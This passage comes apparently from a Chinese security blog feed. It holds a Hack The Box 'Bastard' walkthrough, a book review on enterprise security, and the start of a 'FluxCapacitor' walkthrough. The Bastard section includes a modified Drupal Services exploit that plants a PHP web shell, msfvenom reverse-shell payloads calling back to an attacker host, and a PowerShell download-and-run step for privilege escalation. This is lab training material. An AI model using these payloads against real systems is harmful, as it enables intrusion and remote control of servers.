OK]</span> Content-Language<span class="hljs-comment">[en]</span>, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, Drupal, HTTPServer<span class="hljs-comment">[Microsoft-IIS/7.5]</span>, IP<span class="hljs-comment">[10.10.10.9]</span>, JQuery, MetaGenerator<span class="hljs-comment">[Drupal 7 (http://drupal.org)]</span>, Microsoft-IIS<span class="hljs-comment">[7.5]</span>, PHP<span class="hljs-comment">[5.3.28,]</span>, PasswordField<span class="hljs-comment">[pass]</span>, Script<span class="hljs-comment">[text/javascript]</span>, Title<span class="hljs-comment">[Welcome to 10.10.10.9 | 10.10.10.9]</span>, UncommonHeaders<span class="hljs-comment">[x-content-type-options,x-generator]</span>, X-Frame-Options<span class="hljs-comment">[SAMEORIGIN]</span>, X-Powered-By<span class="hljs-comment">[PHP/5.3.28, ASP.NET]</span><br></code></pre></div></td></tr></table></figure><h4 id="searchsploit-msf模块，查点"><a href="#searchsploit-msf模块，查点" class="headerlink" title="searchsploit\msf模块，查点"></a>searchsploit\msf模块，查点</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">第一：Drupal &lt; <span class="hljs-number">7.58</span> - <span class="hljs-string">&#x27;Drupalgeddon3&#x27;</span> (Authenticated) Remote Code (Metasploit)                                    | exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">44557</span>.rb<br><br>searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">44557</span>.rb<br><br>cp <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/9/</span><span class="hljs-number">44557</span>.rb <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/m</span>odules<span class="hljs-regexp">/exploits/u</span>nix<span class="hljs-regexp">/webapp/</span>drupal_drupalgeddon3.rb<br><br>User register form with exec,该漏洞需要注册用户，并登陆使用cookies。然而user/register模块提示，不能注册用户，网站配置问题。<br><br>第二：Drupal &lt; <span class="hljs-number">8.3</span>.<span class="hljs-number">9</span> <span class="hljs-regexp">/ &lt; 8.4.6 /</span> &lt; <span class="hljs-number">8.5</span>.<span class="hljs-number">1</span> - <span class="hljs-string">&#x27;Drupalgeddon2&#x27;</span> Remote Code Execution (Metasploit)                     | exploits<span class="hljs-regexp">/php/</span>remote/<span class="hljs-number">44482</span>.rb<br><br>exploit<span class="hljs-regexp">/unix/</span>webapp/drupal_drupalgeddon2       <span class="hljs-number">2018</span>-<span class="hljs-number">03</span>-<span class="hljs-number">28</span>       excellent  Yes    Drupal Drupalgeddon <span class="hljs-number">2</span> Forms API Property Injection<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/9.PNG" alt="9"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>dirbuster扫描：能访问的目录都是无关紧要的，敏感目录如admin/includes/都是403。<br>burp scanner扫描：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">robots</span>.txt<br><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.9</span>/CHANGELOG.txt<br><span class="hljs-attribute">Drupal</span> <span class="hljs-number">7</span>.<span class="hljs-number">54</span>, <span class="hljs-number">2017</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span><br></code></pre></div></td></tr></table></figure><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/22.PNG" alt="22"></p><p><a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a></p><h4 id="droopescan"><a href="#droopescan" class="headerlink" title="droopescan"></a>droopescan</h4><p><code>droopescan scan drupal -u http://10.10.10.9/</code></p><p>发现了目标存在3个plugins，经过搜索，发现Services模块有漏洞。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/2.PNG" alt="2"></p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">searchsploit drupal | <span class="hljs-keyword">grep</span> <span class="hljs-number">41564</span><br>searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">41564</span>.php<br>mv <span class="hljs-regexp">/root/</span><span class="hljs-number">41564</span>.php rce.php<br>see rce.php<br></code></pre></div></td></tr></table></figure><h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><p>php解析exp出错。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/6.PNG" alt="6"><br>普通文本编辑器看不出来错误在哪，用vi看了一下==，居然是注释换行的问题。</p><p>缺少一个模块，导致exp运行出错。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y install php-curl<br>apt-<span class="hljs-builtin-name">get</span><span class="hljs-built_in"> upgrade </span>php 更新到PHP 7.3.2-3 ，问题解决了<br></code></pre></div></td></tr></table></figure><h4 id="问题2："><a href="#问题2：" class="headerlink" title="问题2："></a>问题2：</h4><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp">apt-<span class="hljs-keyword">get</span> -y install php-curl<br>E: Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">lock</span> /<span class="hljs-keyword">var</span>/lib/dpkg/<span class="hljs-keyword">lock</span> - open (<span class="hljs-number">11</span>: Resource temporarily unavailable)<br>E: <span class="hljs-function">Unable to <span class="hljs-keyword">lock</span> the administration <span class="hljs-title">directory</span> (<span class="hljs-params">/<span class="hljs-keyword">var</span>/lib/dpkg/</span>), <span class="hljs-keyword">is</span> another process <span class="hljs-keyword">using</span> it?</span><br></code></pre></div></td></tr></table></figure><p>解决方案：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock<br><br>重新执行安装命令后，提示以下消息<br>E: Could not get lock <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/lock - open (<span class="hljs-number">11</span>: Resource temporarily unavailable)<br>E: Unable to lock directory <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/<br><br>rm <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/lock 即可<br></code></pre></div></td></tr></table></figure><h2 id="修改php-exp"><a href="#修改php-exp" class="headerlink" title="修改php exp"></a>修改php exp</h2><p><a href="https://www.exploit-db.com/exploits/41564%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E8%AF%A5exp%E6%98%AF%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E7%9A%84%EF%BC%8C%E9%9C%80%E8%A6%81%E4%BF%AE%E6%94%B9%E5%BE%88%E5%A4%9A%E5%A4%84%E4%BD%8D%E7%BD%AE%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%AE%9E%E9%AA%8C%E6%88%91%E5%81%9A%E4%BA%86%E5%BE%88%E4%B9%85%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%8D%A1%E5%9C%A8php%E4%BB%A3%E7%A0%81%E4%B8%8A%E3%80%82%E8%BF%98%E6%98%AF%E9%9C%80%E8%A6%81%E4%B8%80%E7%82%B9php%E7%9A%84%E7%9F%A5%E8%AF%86%E3%80%82">https://www.exploit-db.com/exploits/41564，不知道为什么，该exp是不能直接运行的，需要修改很多处位置，这个实验我做了很久，就是卡在php代码上。还是需要一点php的知识。</a></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/php</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Drupal Services Module Remote Code Execution Exploit</span><br><br><span class="hljs-comment"># https://www.ambionics.io/blog/drupal-services-module-rce</span><br><br><span class="hljs-comment"># cf</span><br><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># Three stages:</span><br>修改第一处，“endpoint”；以及下面另外一处的注释<br><span class="hljs-comment"># 1. Use the SQL Injection to get the contents of the cache for current endpoint</span><br><br><span class="hljs-comment">#    along with admin credentials and hash</span><br><br><span class="hljs-comment"># 2. Alter the cache to allow us to write a file and do so</span><br><br><span class="hljs-comment"># 3. Restore the cache</span><br><br><span class="hljs-comment"># </span><br><br><span class="hljs-comment"># Initialization</span><br><br>error_reporting(E_ALL);<br><br>define(<span class="hljs-string">&#x27;QID&#x27;</span>, <span class="hljs-string">&#x27;anything&#x27;</span>);<br><br>define(<span class="hljs-string">&#x27;TYPE_PHP&#x27;</span>, <span class="hljs-string">&#x27;application/vnd.php.serialized&#x27;</span>);<br><br>define(<span class="hljs-string">&#x27;TYPE_JSON&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br><br>define(<span class="hljs-string">&#x27;CONTROLLER&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br><br>define(<span class="hljs-string">&#x27;ACTION&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span>);<br><br>修改第<span class="hljs-number">2</span>处，目标ip<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://10.10.10.9/&#x27;</span>;<br>修改第<span class="hljs-number">3</span>处，路径<br><span class="hljs-variable">$endpoint_path</span> = <span class="hljs-string">&#x27;/rest&#x27;</span>;<br><br><span class="hljs-variable">$endpoint</span> = <span class="hljs-string">&#x27;rest_endpoint&#x27;</span>;<br><br><span class="hljs-variable">$file</span> = [<br>修改第<span class="hljs-number">4</span>处，写入的文件名和内容。<br>    <span class="hljs-string">&#x27;filename&#x27;</span> =&gt; <span class="hljs-string">&#x27;whale.php&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;&lt;?php echo(system($_GET[&quot;cmd&quot;])); ?&gt;&#x27;</span><br>];<br><br></code></pre></div></td></tr></table></figure><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>view-source:<a href="http://10.10.10.9/whale.php?cmd=whoami">http://10.10.10.9/whale.php?cmd=whoami</a></p><table><thead><tr><th>cmd</th><th>result</th></tr></thead><tbody><tr><td>whoami</td><td>nt authority\iusr</td></tr><tr><td>systeminfo</td><td>Microsoft Windows Server 2008 R2</td></tr><tr><td>dir</td><td>C:\inetpub\drupal-7.54</td></tr><tr><td>type C:\Users\dimitris\Desktop\user.txt</td><td>xxx</td></tr><tr><td>powershell $PSVersionTable</td><td>无ps</td></tr></tbody></table><h2 id="获取metepreter"><a href="#获取metepreter" class="headerlink" title="获取metepreter"></a>获取metepreter</h2><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f raw &gt; payload1.txt</p><p>修改php exp</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">$myfile = <span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;payload1.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) or die(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br><br>$payload1 = <span class="hljs-keyword">fread</span>($myfile,filesize(<span class="hljs-string">&quot;payload1.txt&quot;</span>));<br><br>$url = <span class="hljs-string">&#x27;http://10.10.10.9/&#x27;</span>;<br><br>$endpoint_path = <span class="hljs-string">&#x27;/rest&#x27;</span>;<br><br>$endpoint = <span class="hljs-string">&#x27;rest_endpoint&#x27;</span>;<br><br><br><br>$file = [<br><br>    <span class="hljs-string">&#x27;filename&#x27;</span> =&gt; <span class="hljs-string">&#x27;whale1.php&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;data&#x27;</span> =&gt; $payload1<br><br>];<br></code></pre></div></td></tr></table></figure><p>handler -H 10.10.14.7 -P 1234 -p php/meterpreter_reverse_tcp</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/4.PNG" alt="4"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考<a href="https://whale3070.github.io/training/2019/02/07/x/">该文章</a>进行提权</p><h4 id="提权尝试一"><a href="#提权尝试一" class="headerlink" title="提权尝试一:"></a>提权尝试一:</h4><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> --platform Windows -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10.14.7</span> LPORT=<span class="hljs-number">7788</span> -e x<span class="hljs-number">86</span>/shikata_ga_nai -b &#x27;\x<span class="hljs-number">00</span>\x<span class="hljs-number">0</span>a\xff&#x27; -i <span class="hljs-number">3</span> -f exe -o payload<span class="hljs-number">2</span>.exe<br><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">10.10.14.7</span> -P <span class="hljs-number">7788</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br></code></pre></div></td></tr></table></figure><p>结果：失败<br>原因：只能通过web执行php类型的metapreter，没有考虑好web不能执行windows二进制（exe）类型payload</p><h4 id="提权尝试二"><a href="#提权尝试二" class="headerlink" title="提权尝试二:"></a>提权尝试二:</h4><p>当payload是<code>php/meterpreter_reverse_tcp</code>时，后续渗透无法使用suggester模块。</p><p>而且该模块不知道为什么，一旦执行命令，就被断开连接。</p><h4 id="提权尝试三"><a href="#提权尝试三" class="headerlink" title="提权尝试三:"></a>提权尝试三:</h4><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.9</span>/whale.php?cmd=systeminfo -<span class="hljs-keyword">o</span> sys.txt<br><span class="hljs-keyword">python</span> windows-exploit-suggester.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">update</span><br><span class="hljs-keyword">python</span> windows-exploit-suggester.<span class="hljs-keyword">py</span> --database <span class="hljs-number">2019</span>-<span class="hljs-number">03</span>-<span class="hljs-number">06</span>-mssb.xls --systeminfo sys.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/5.PNG" alt="5"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/7.PNG" alt="7"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> --platform Windows -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10.14.7</span> LPORT=<span class="hljs-number">9009</span> -f exe -o p.exe<br><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">10.10.14.7</span> -P <span class="hljs-number">9009</span> -p windows/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span> 用nc反弹的cmd，把p.exe用powershell传到目标机<br><br><span class="hljs-attribute">powershell</span> -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#x27;http://<span class="hljs-number">10.10.14.7</span>/MS<span class="hljs-number">10</span>-<span class="hljs-number">059</span>.exe&#x27;,&#x27;C:\inetpub\drupal-<span class="hljs-number">7</span>.<span class="hljs-number">54</span>\<span class="hljs-number">15</span>.exe&#x27;)<br><br><span class="hljs-attribute">15</span>.exe <span class="hljs-number">10.10.14.7</span> <span class="hljs-number">5555</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-05/8.PNG" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>google “IIS vesions”，进行windows操作系统的识别</p><p>github下载droopescan，对drupal进行扫描。</p><p>? 如何识别cms的漏洞。<br>当遇到一个陌生的cms时，可以先在github上搜索cms对应的扫描器，而不是自己手动通过服务版本识别，再找exp，逐个确认是否有已知漏洞。这样效率会很低。</p><p>？为什么要使用droopescan<br>扫描器都是基于插件或者是特征库的，你不能用nessus扫描web漏洞，appscan扫描系统漏洞。选择合适的扫描器。</p><p>？如何自动下载python程序所需的依赖<br><code>pip install -r requirements.txt</code></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>cms</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读后感·互联网企业安全高级指南</title>
    <link href="/2019/03/04/x/"/>
    <url>/2019/03/04/x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/view/2018/11/09/x/">如何寻找一家靠谱的公司</a></p><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><h4 id="第二份实习"><a href="#第二份实习" class="headerlink" title="第二份实习"></a>第二份实习</h4><p>由于想要毕业以后，做信息安全服务or渗透测试相关的工作，学校课程又比较少，我又去找了一份实习。实习还是有一些收获，虽然不是技术方面，但我不禁想要谈谈工作相关的话题。</p><p>公司名字具体叫什么，我就不说了。当初面试的时候，我问A先生（技术负责人），是否有大佬带实习生。公司的人敷衍塞责过去了，说这点东西都还要人带-。-…..顺便diss了我的技术水平。</p><p>我以为是因为大佬们工作太忙了，，所以没有多想。</p><p>该公司技术部有技术的人可以说是<strong>几乎没有</strong>，那么作为一家安全公司，他的盈利模式到底是怎样的呢？</p><p>该公司只有销售以及技术两大部门（财务/人力资源这里不提），通过销售人员，将安全硬件通过一些渠道卖给小客户；从专科院校招一些刚出学校的人，驻场在甲方公司（国企单位），做一些<strong>表面安全性</strong>工作，应付zf检查。</p><p>所以该公司（2014年注册成立），可以说是并没有什么加入的价值。在这种公司，销售人员&gt;技术人员的模式，上蒙客户下应付员工，销售走了一波再招一波，我不做更多评价。</p><p>说来惭愧，因为二十出头，社会经验尚浅……而这种公司的存在，也是让我开了眼界。</p><hr><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><a href="https://whale3070.github.io/view/2018/09/29/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%BB%8E%E4%B8%9A%E6%8C%87%E5%8D%972.0/">信息安全行业从业指南2.0</a><br>上一次在网上看到这篇文章后，觉得写的很清楚。看到这本书，赶紧买来看。</p><p>看书，当然是带着目的性去看。</p><p>以前一直知道有互联网企业、传统企业，甲方、乙方。</p><p>大体只知道，互联网企业就是业务基本上放在互联网上的，比如说电子商务之类的。</p><p>甲方是业务不以安全为主的公司，各行各业都需要和网络打交道，但主要业务可能是卖车、卖保险等等，像三巨头，bat，B百度-A阿里巴巴-T腾讯，主体业务不是网络安全。</p><p>乙方是以安全作为业务，为各种企业提供安全设备、安全服务等等。</p><h4 id="企业安全的7大领域："><a href="#企业安全的7大领域：" class="headerlink" title="企业安全的7大领域："></a>企业安全的7大领域：</h4><ol><li>网络安全（pc/server/network .etc）纯技术方向</li><li>平台和业务安全（和甲方公司的具体业务相关）</li><li>广义信息安全（包括隐私、数据、纸质文档等信息的安全）</li><li>IT风险管理、IT审计&amp;内控（合规建设）</li><li>业务持续性管理（灾难恢复之类）</li><li>安全品牌营销、渠道维护</li><li>其他需求</li></ol><h4 id="互联网企业和传统企业对于安全性，有什么不同的要求？"><a href="#互联网企业和传统企业对于安全性，有什么不同的要求？" class="headerlink" title="互联网企业和传统企业对于安全性，有什么不同的要求？"></a>互联网企业和传统企业对于安全性，有什么不同的要求？</h4><p>互联网企业：信息安全管理、基础构架与网络安全、应用与交付安全（甲方没有足够的能力完成完整的SDL，将这方面外包给乙方安全公司去做）、业务安全。</p><p>互联网企业和传统企业在业务上的区别：前者业务主要放在互联网上，而传统企业主要放在线下，所以对于后者来说，安全性工作面临的挑战要更简单一些。</p><p>互联网企业对于安全解决方案是以攻防为驱动的，要在服务器上装防病毒软件，不可行的原因：性能损耗、运维成本、软件成本太高。</p><p>大型互联网公司，IT建设开始自己发明轮子，完全符合自身业务的解决方案，而不是使用一些标准化的合规、等级保护（太简单且达不到高等级安全要求）之类的东西。</p><h4 id="生态级企业-amp-平台级企业的区别"><a href="#生态级企业-amp-平台级企业的区别" class="headerlink" title="生态级企业&amp;平台级企业的区别"></a>生态级企业&amp;平台级企业的区别</h4><p>生态级公司安全建设是自己研发; 平台级别采用开源工具</p><p>平台级企业的安全团队的知识：web/app、应用层协议、web容器、中间件、数据库</p><p>生态级公司：系统底层、二进制、运行时环境和内核级别</p><p>大牛即使去小公司也无用武之地。</p><h4 id="甲方、乙方做安全，工作内容有何不同？"><a href="#甲方、乙方做安全，工作内容有何不同？" class="headerlink" title="甲方、乙方做安全，工作内容有何不同？"></a>甲方、乙方做安全，工作内容有何不同？</h4><p>对于甲方安全团队，安全是一个保值型部门，而不是盈利部门。安全成本和公司盈利能力相关。很好理解，如果说盈利部门负责赚钱，安全部门就是保险箱，负责钱不会变少或者突然不见。</p><p>而在乙方，可以对某一方向无限深挖（也属于业务要求），但同时也会杂而不精，和上一句不冲突。因为乙方服务的甲方公司不会是同一种，所以要求也不同。</p><h4 id="乙方安全服务的不同方向？"><a href="#乙方安全服务的不同方向？" class="headerlink" title="乙方安全服务的不同方向？"></a>乙方安全服务的不同方向？</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-04/1.jpg" alt="1"></p><h4 id="什么是（乙方）合规体系化建设工程师？"><a href="#什么是（乙方）合规体系化建设工程师？" class="headerlink" title="什么是（乙方）合规体系化建设工程师？"></a>什么是（乙方）合规体系化建设工程师？</h4><p><strong>ISO27001与等级保护</strong>:ISO27001它的目标是帮助企业建设、运行、维护和改进信息安全管理体系。<br>它的目标是以合适的成本提供满足客户质量要求的IT服务，从流程、人员和技术三方面提升IT的效率和效用。让类似某订票网发生过的员工误操作不再发生，让各类投诉处理得更快，让企业内部安全漏洞修补的效率更高，让混乱不再存在，让救火队卸甲归田，这就是ISO20000的职责所在。</p><p>中大规模的甲方企业都有SOX-404类似的合规性需求。</p><p>甲方公司可能会遇到什么安全性问题，当遇到问题时，要用什么方式解决，如何防范出现问题。这就是合规的目的。</p><h4 id="为什么从事信息安全行业一定要去大公司？"><a href="#为什么从事信息安全行业一定要去大公司？" class="headerlink" title="为什么从事信息安全行业一定要去大公司？"></a>为什么从事信息安全行业一定要去大公司？</h4><p>大的公司才有更大更实际重视安全的可能性。“有钱”的公司往往比“没钱”的公司更重视安全，因为安全是一种奢侈品。</p><hr><p>参考资料：</p><p><a href="https://zhuanlan.zhihu.com/p/33229114">在乙方从事网络安全工作的一些思考</a></p><p><a href="https://www.zhihu.com/question/27356955">https://www.zhihu.com/question/27356955</a></p><p><a href="http://www.360doc.com/content/16/0314/22/31115656_542242914.shtml">http://www.360doc.com/content/16/0314/22/31115656_542242914.shtml</a></p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FluxCapacitor（from nobody to root）</title>
    <link href="/2019/03/03/x/"/>
    <url>/2019/03/03/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.69</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><p><code>80/tcp open  http    SuperWAF</code></p><p>查看源代码，有一段注释，是javascript代码。</p><figure class="highlight dust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dust"><span class="xml"><span class="hljs-comment">&lt;!--</span></span><br><span class="hljs-comment"><span class="xml">Please, add timestamp with something like:</span></span><br><span class="hljs-comment"><span class="xml">&lt;script&gt; $.ajax(</span></span><span class="hljs-template-variable">&#123; type: &quot;GET&quot;, url: &#x27;/sync&#x27; &#125;</span><span class="xml"><span class="hljs-comment">); &lt;/script&gt;</span></span><br><span class="hljs-comment"><span class="xml">--&gt;</span></span><br></code></pre></div></td></tr></table></figure><p>于是访问<code>http://10.10.10.69/sync</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;white&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>openresty/1.13.6.1<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>OpenResty® 是一个基于 <a href="https://openresty.org/cn/nginx.html">Nginx</a> 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 